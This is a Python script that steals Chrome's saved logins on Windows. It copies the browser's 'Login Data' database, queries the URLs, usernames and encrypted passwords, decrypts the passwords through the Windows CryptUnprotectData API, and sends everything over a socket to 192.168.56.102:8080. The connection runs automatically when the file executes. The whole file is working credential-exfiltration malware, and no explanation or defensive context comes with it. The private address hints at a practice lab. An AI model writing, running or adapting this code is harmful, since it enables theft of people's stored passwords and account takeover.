

import socket
import subprocess
from os import getenv 
import sqlite3        
import win32crypt
from shutil import copyfile 


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.56.102',8080))
    
# LOCALAPPDATA points to >>> C:\Users\{username}\AppData\Local

    path = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login Data"
    path2 = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login2"
    copyfile(path, path2)

    conn = sqlite3.connect(path2)

    cursor = conn.cursor() 


    cursor.execute('SELECT action_url, username_value, password_value FROM logins') 


    # To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.
    for raw in cursor.fetchall():
        
        #print raw[0] + '\n' + raw[1]
        s.send( raw[0] + '\n' + raw[1] )
        
        password = win32crypt.CryptUnprotectData(raw[2])[1] # pass the encrypted Password to CryptUnprotectData API function to decrypt it  
        #print password
        
        s.send(password)
        
    conn.close()
    s.close()

def main():
    connect()
main()

